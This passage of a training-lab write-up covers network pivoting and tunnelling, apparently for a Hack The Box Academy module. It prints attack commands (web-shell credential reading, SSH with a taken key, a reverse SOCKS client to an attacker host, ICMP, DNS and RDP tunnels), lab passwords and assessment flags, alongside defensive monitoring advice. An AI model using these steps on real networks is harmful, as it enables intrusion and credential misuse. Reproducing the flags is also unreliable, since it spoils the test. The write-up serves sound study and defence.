```

**This path is an example**. It only works after the file is actually copied into the named directory. Open `mstsc.exe` and RDP into `172.16.5.19` with `victor:pass@123`. Copy the executable to the remote DC, then run:

```cmd
SocksOverRDP-Server.exe
```

Back on Windows 10, confirm the local SOCKS port:

```cmd
netstat -ano | findstr :1080
```

Configure Proxifier at **Profile → Proxy Servers** to use `127.0.0.1:1080`, protocol SOCKS5, and set a rule for `mstsc.exe` traffic to `172.16.6.155`. Then RDP to the deeper server using `jason:WellConnected123!` and retrieve:

```cmd
dir C:\Users\jason\Desktop
type C:\Users\jason\Desktop\Flag.txt
```

### Real blocker in the conversation

The attempted command `regsvr32.exe SocksOverRDP-Plugin.dll` failed with **“The specified module could not be found”** because the DLL had not been staged at the expected path. A subsequent `dir /s /b` search also did not locate it. The ZIP **does not include a successful registration or downstream RDP screenshot**. The former assistant cited a public walkthrough value `H0pping@roundwithRDP!`, but this is **reference-only**, not a verified user result.

### Troubleshooting and defense

If the DLL is missing, download and transfer it **before** rerunning `regsvr32`; never assume it lives in `C:\Windows\System32`. If the file exists but fails to load, verify bitness and Visual C++ runtime dependencies. If no SOCKS listener appears, make sure the DLL has been loaded by the **current** `mstsc.exe` session and the remote EXE is still running. Administrators can monitor unusual RDP virtual channels and restrict unnecessary channel features; controls should be balanced against legitimate clipboard and device redirection requirements.

**Status:** **Practiced / partial**; the final Jason flag remains **Evidence Pending**.

## 16 — Skills Assessment: Multi-Hop Internal Access

### Scope and objective

This assessment chains several pivoting concepts. The first reachable target is a web server (`10.129.229.129`, lab-specific), with an application-level shell. From there, the student should discover exposed credentials in a user home directory, enumerate the adjacent private network, reach SERVER01, inspect service-account exposure, move to a workstation, and finally obtain a file from the DC. Seven questions form a connected story; finding one answer does not imply every hop was completed.

### Stage A — Web foothold, host enumeration and credential exposure (Q1–Q2)

The provided screenshot shows a web shell running as `www-data@inlanefreight.local`, with these authorized enumeration commands:

```bash
ls -la /home
ls -la /home/webadmin
cat /home/webadmin/for-admin-eyes-only
```

The system contains `/home/administrator` and `/home/webadmin`. The latter directory exposes a private key and a note named `for-admin-eyes-only`. The note directly identifies the internal account `mlefay` and password `Plain Human work!`. Thus, the primary evidence verifies:

```text
Q1: webadmin
Q2: mlefay:Plain Human work!
```



![Evidence 26: Web shell directory enumeration and direct display of the exposed credential note](/writeups/evidence/htb-pivoting-tunneling-port-forwarding/evidence-26.jpg "Web shell directory enumeration and direct display of the exposed credential note")



**Security interpretation:** private SSH keys or plaintext credential notes being readable by a web application user create a bridge from a low-privileged web compromise to lateral movement. This is a credential-exposure issue, not proof that the SSH key's owner intentionally granted administrator access.

### Stage B — Establish a stable Linux pivot and discover SERVER01 (Q3)

With permission to use the exposed lab key, copy the key through the existing shell/session to Pwnbox, store it with mode 600, and authenticate to the active WEB01 host:

```bash
chmod 600 ./webadmin_id_rsa
ssh -i ./webadmin_id_rsa webadmin@10.129.229.129

# On WEB01 after SSH authentication
ip -br addr
ip route
for i in $(seq 1 254); do
  (ping -c 1 -W 1 "172.16.5.$i" 2>/dev/null | grep 'bytes from') &
done
wait
```

The earlier external walkthrough reported the second active server as `172.16.5.35`. That address is a useful **candidate for verification**, but the ZIP does not contain the user's own ping-sweep or network-scan output for this assessment. Confirm the route and a listening service, rather than treating a reference answer as live evidence.

### Stage C — Forward to SERVER01 and retrieve C:\Flag.txt (Q4)

If the Ubuntu pivot has an SSH listener and can reach `172.16.5.35:3389`, forward one fixed RDP port from Pwnbox:

```bash
ssh -i ./webadmin_id_rsa -N -L 13389:172.16.5.35:3389 webadmin@10.129.229.129
```

In another terminal, connect with the credentials from the note:

```bash
xfreerdp /v:127.0.0.1:13389 /u:mlefay /p:'Plain Human work!' /cert:ignore
```

Once inside **SERVER01**, run:

```cmd
hostname
whoami
type C:\Flag.txt
```

A previously referenced online walkthrough value for Q4 was `S1ngl3-Piv07-3@sy-Day`. **No screenshot from this ZIP shows that file**, so record it as **Reference only / unverified**.

### Stage D — Identify the service-account weakness (Q5)

On SERVER01, inventory services and look for accounts or service configurations that expose credentials or delegate network access unexpectedly:

```powershell
Get-CimInstance Win32_Service |
  Select-Object Name, StartName, PathName | Format-Table -AutoSize
```

Other low-impact checks include `cmdkey /list`, `whoami /all`, service process owners, RDP client history and mapped resources. Keep sensitive evidence carefully separated from public-facing write-ups. The externally reported answer was **`vfrank`**, associated with a misused service account; the specific instance has **not** been verified with a matching service screenshot. Avoid implying that `wmic service` itself prints the password; it typically reveals the run-as identity, not its secret.

### Stage E — Workstation second hop (Q6)

Re-enumerate interfaces and reachable subnets **from SERVER01**, because another hop can reveal `172.16.6.0/24` even if the initial web host cannot see it. If an authorized session on SERVER01 can reach the workstation's TCP/3389, start Windows Remote Desktop from that host:

```cmd
ipconfig
route print
mstsc /v:172.16.6.25
```

The `172.16.6.25` destination and the example service-account password `Imply wet Unmasked!` came from earlier walkthrough discussion, **not from the uploaded evidence**. Authenticate only with credentials you have actually discovered or that the lab expressly supplies, then verify `C:\Flag.txt` on the workstation. A prior reference reported Q6 as `N3tw0rk-H0pp1ng-f0R-FuN`; it remains **unverified in the current screenshot set**.

### Stage F — Domain Controller flag (Q7)

From the workstation, inspect available mapped drives or approved administrative shares:

```cmd
net use
whoami /all
```

If an already mapped drive points to the DC and is accessible under the session's current permissions, inspect it rather than guessing credentials:

```cmd
dir Z:\
type Z:\Flag.txt
```

The walkthrough referenced a drive named `AutomateDCAdmin (Z:)` and the Q7 answer `3nd-0xf-Th3-R@inbow!`. These are **reference-only claims** until a screenshot, directory listing or `type` output shows the user's actual instance. The ZIP contains **no proof** of the final workstation or DC file access.

### Seven-question evidence ledger

| Question | Observed or reference value | Evidence classification |
|---|---|---|
| Q1 — credential directory user | `webadmin` | **Verified**, image 26 |
| Q2 — credentials | `mlefay:Plain Human work!` | **Verified**, image 26 |
| Q3 — reachable private host | `172.16.5.35` | Reference only; verify scan |
| Q4 — SERVER01 flag | `S1ngl3-Piv07-3@sy-Day` | Reference only |
| Q5 — vulnerable account | `vfrank` | Reference only |
| Q6 — workstation flag | `N3tw0rk-H0pp1ng-f0R-FuN` | Reference only |
| Q7 — DC flag | `3nd-0xf-Th3-R@inbow!` | Reference only |

**Status:** Q1/Q2 **Verified**, remaining Q3–Q7 **Evidence Pending**. Do not present the assessment as fully completed.

## 17 — Detection & Prevention

### Why the same pivot path creates telemetry

Pivoting hides reachability from a naive asset scan, but it does not make traffic invisible. SSH forwarding produces new listener sockets and encrypted SSH connections; Windows portproxy creates configuration changes and forwarded TCP flows; Meterpreter and Socat relay connections create process-network edges; dnscat2 and ptunnel-ng can create abnormal traffic patterns in DNS and ICMP; SocksOverRDP can use RDP dynamic virtual channels. Detection combines **host-level process evidence** with **network flow and protocol metadata**.

### Defensive monitoring matrix

| Technique | What defenders can inspect | Useful mitigations |
|---|---|---|
| SSH `-L/-R/-D`, Plink, sshuttle | `ss/netstat`, listening localhost ports, SSH command lines, tunnel connections, SSH daemon logs | MFA/keys, restrict `AllowTcpForwarding`, `PermitOpen`, `GatewayPorts`; segment reachability |
| Meterpreter / autoroute / Socat | Unexpected listener chains, parent processes, outbound flows to internal endpoints | EDR process telemetry, least privilege, application control |
| Windows `netsh portproxy` | `netsh interface portproxy show all`, registry configuration, firewall-rule changes | Restricted admin privileges, firewall egress policies, configuration baselines |
| Rpivot / Chisel | Proxy ports, unusual long-lived TCP sessions, host-to-host traffic across trust zones | Egress filtering, alert on new proxies and binaries, allowlisted administration paths |
| Dnscat2 | High-entropy DNS labels, repetitive query timing, unexpected resolvers, TXT/CNAME bursts | DNS egress restrictions, resolver logging and anomaly detection |
| ptunnel-ng | Abnormal ICMP payload sizes, high-frequency ICMP, large bidirectional ping traffic | Inspect ICMP beyond just rate counts; restrict transit where practical |
| SocksOverRDP | RDP dynamic virtual channels, unexpected client plugin DLLs, localhost SOCKS listeners | Limit unneeded RDP channels and client extensions, monitor DLL loading |

### Windows-specific checks

```powershell
# Document portproxy configuration and local listener state
netsh interface portproxy show all
Get-NetTCPConnection -State Listen | Sort-Object LocalPort
Get-NetFirewallRule | Where-Object DisplayName -match 'RDP|Pivot|SOCKS'

# View Windows logon and process events in a relevant time window
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4688; StartTime=(Get-Date).AddHours(-2)} -ErrorAction SilentlyContinue
```

Event 4688 process command-line detail depends on local auditing settings; Sysmon Event ID 3 network-connection details depend on whether Sysmon is installed and configured. Logs should never be assumed present in every lab image. Also consider IPv6 paths when designing firewall and host baselines: a control applying only to IPv4 can miss IPv6 reachability.

### Response and containment

Inventory unexpected listener ports, validate who started them, correlate to changes and authentication events, remove unauthorized portproxy rules, revoke compromised credentials, and narrow firewall trust boundaries. Do not disable critical services or RDP virtual channels without considering business impact. For a controlled test, cleanup should include local proxy processes, temporary tool binaries, firewall rules, and reports of any sensitive credential material inadvertently discovered.

**Status:** theory and defense guidance; **Evidence Pending — no blue-team telemetry screenshot provided**.

## 18 — Beyond this Module

### Consolidated technique selection guide

| Situation | Starting technique | Important constraint |
|---|---|---|
| Reach exactly one internal TCP service through Linux | SSH local `-L` | One destination per forward |
| Reach multiple internal TCP services through Linux | SSH dynamic `-D` + ProxyChains | TCP-app support and SOCKS configuration |
| Redirect selected TCP subnets without changing each app | `sshuttle` | Platform/firewall requirements |
| Existing Metasploit foothold | Meterpreter AutoRoute + SOCKS | In-framework session and routing |
| Simple TCP splice on a dual-homed host | Socat | No implicit shell and no encryption by default |
| Outbound pivot connection is easiest | Rpivot reverse SOCKS | Correct client/server placement; legacy Python |
| Windows dual-homed host, one internal RDP service | Netsh portproxy | TCP-only; admin/firewall considerations |
| HTTP/WebSocket egress available | Chisel | Matching binary and SOCKS direction |
| DNS is the only allowed channel | Dnscat2 | DNS integrity, endpoint/egress policies |
| ICMP permitted while TCP blocked | ptunnel-ng | Transport instability, permissions, protocol monitoring |
| Windows RDP jump chain | SocksOverRDP + Proxifier | Proper DLL/EXE placement and RDP virtual channels |

### Operator checklist for an authorized lab

1. Identify which machine owns every `127.0.0.1` and every listening port.
2. Confirm interfaces and destination networks on the **pivot host**, not only Pwnbox.
3. Test one TCP destination (`nc`, `Test-NetConnection`) before launching GUI RDP.
4. Keep tunnel server and client terminals open; record their respective IPs and ports.
5. Verify that a binary runs on the target OS (`file`, `ldd`, supported runtime versions).
6. Treat `Connection refused`, `Connection closed`, DNS timeouts, missing DLLs and library errors as different problem classes.
7. Read the actual file listing before assuming `Flag.txt` is exactly named; several practice images show `flag.txt.txt`.
8. Capture a screenshot with the command **and the corresponding result**; a command typed in a terminal is not proof of success.
9. Report any remaining question as **Evidence Pending**, not as completed by inference or a third-party answer.
10. Shut down temporary services and remove portproxy/firewall changes at the end of the assessment.

### Lessons learned from the submitted practice

The strongest successes came from using the shortest suitable transport: SSH local forwarding for one RDP service, a reverse SOCKS tunnel for Rpivot's internal HTTP page, Windows portproxy for a Windows jump host, Dnscat2 for a DNS-only command channel, and direct RDP-over-ICMP when layered SSH-over-ICMP proved unstable. The most expensive mistakes were listener/client placement reversal, assuming the attacker could directly route to the private subnet, copying a dynamically linked binary to an older Ubuntu release, attempting a feature omitted from a static build, registering an absent DLL, and searching for `flag.txt` when the actual file was `flag.txt.txt`.

## Appendix A — Evidence inventory and provenance

The original ZIP contained **26 image files**. Files 13–26 match the pivoting exercises or assessment by visually identifiable IPs, command lines, page titles and file output. Files 01–12 instead show FTP/SQL/service-enumeration activity with a different target (`10.129.201.127` and other service workflows) and **should not be falsely attributed** to Module 158. They are preserved in the downloadable evidence bundle as an **unmapped** collection; they are not inserted as if they proved a pivoting step.

| ZIP image alias | Identifiable content | Used in section |
|---|---|---|
| `evidence-01` to `evidence-12` | SSH/DNS/FTP/POP3/SQL service enumeration, likely another module | Unmapped; preserved only |
| `evidence-13` | SSH RDP desktop + `N1c3Pivot` | 04 |
| `evidence-14` | Dual NIC, `nc` 3389 and `ssh -L` | 02, 04 |
| `evidence-15` | Ping sweep initiated on Pwnbox with no response | 02 |
| `evidence-16` | Rpivot connection refused, corrected client IP and successful connection | 10 |
| `evidence-17` | `curl --socks4` against internal web server | 10 |
| `evidence-18` | Windows portproxy + firewall configuration | 11 |
| `evidence-19` | `VendorContacts.txt` displays `Jim Flipflop` | 11 |
| `evidence-20` | Dnscat2 PowerShell client, terminal and flag | 12 |
| `evidence-21` | Chisel GLIBC failure | 13 |
| `evidence-22` | SSH via ICMP attempted | 14 |
| `evidence-23` | ICMP/SSH handshake and disconnect | 14 |
| `evidence-24` | ptunnel/RDP debugging | 14 |
| `evidence-25` | Final ICMP RDP session and flag | 14 |
| `evidence-26` | Web shell credential note | 16 |

The evidence alias is an order-preserving rename for readability; the download ZIP also includes `evidence_manifest.json` mapping the aliases to the original filenames and SHA-256 hashes. No screenshot was fabricated.

## Appendix B — Command quick reference

```bash
# NETWORK INSPECTION
ip -br addr; ip route; ss -lnt

# SSH: local fixed port; dynamic SOCKS; remote forwarded port
ssh -N -L 13389:172.16.5.19:3389 ubuntu@PIVOT_IP
ssh -N -D 9050 ubuntu@PIVOT_IP
ssh -N -R 18080:127.0.0.1:8080 user@SSH_SERVER

# CONNECT THROUGH LOCAL RDP FORWARD
xfreerdp /v:127.0.0.1:13389 /u:victor /p:'pass@123' /cert:ignore

# SSHUTTLE
sshuttle -r ubuntu@PIVOT_IP 172.16.4.0/23

# SOCAT: forward one TCP listening socket
socat TCP4-LISTEN:8080,reuseaddr,fork TCP4:172.16.5.19:3389

# RPIVOT: Pwnbox server, Ubuntu client
python2 server.py --server-ip 0.0.0.0 --server-port 9999 --proxy-port 9050
python2 client.py --server-ip ATTACK_VPN_IP --server-port 9999
curl --socks4 127.0.0.1:9050 http://172.16.5.135/

# CHISEL: Ubuntu server, Pwnbox client
./chisel server --socks5 -p 1234
chisel client PIVOT_IP:1234 socks

# PTUNNEL-NG: Ubuntu receiver, Pwnbox sender
sudo ./ptunnel-ng -r172.16.5.19 -R3389 -v 2
sudo ./ptunnel-ng -pPIVOT_IP -l13389 -r172.16.5.19 -R3389 -v 2
```

```cmd
:: WINDOWS NETSH REDIRECTION
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=WINDOWS_PIVOT_IP connectport=3389 connectaddress=172.16.5.19
netsh interface portproxy show all

:: CHECK FILE NAMES
 dir C:\Users\victor\Downloads
 type C:\Users\victor\Downloads\flag.txt.txt
```

## Appendix C — References and limitations

- [Hack The Box Academy — Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/app/module/158) and [course preview](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding). These provide the module identity and scope; this report independently restates techniques rather than reproducing licensed lesson text.
- [HTB Academy Module Structure](https://help.hackthebox.com/en/articles/12741910-academy-modules-paths) — how interactive sections and assessment questions work.
- [NCC Group — SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) — DLL client, server executable and dynamic-channel behavior.
- [ptunnel-ng](https://github.com/utoni/ptunnel-ng) — ICMP forwarding project.
- [Rpivot](https://github.com/klsecservices/rpivot) — reverse SOCKS source.
- [Dnscat2](https://github.com/iagox86/dnscat2) and [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) — DNS command-channel components.
- [Chisel](https://github.com/jpillora/chisel) — HTTP/WebSocket tunnel and SOCKS support.
- [sshuttle](https://github.com/sshuttle/sshuttle) and [PuTTY/Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/) — remote SSH networking clients.

**Limitations:** Several ephemeral HTB lab IP addresses in the screenshots do not match newer instances. Runtime commands may require adaptation to specific operating system versions and tool releases. Screenshots prove only the displayed states. Flags from earlier third-party walkthrough discussion remain labeled as references unless the exact flag is visible in a supplied screenshot. No inaccessible host was contacted while preparing this document; no GitHub repository, website or deployment was modified.
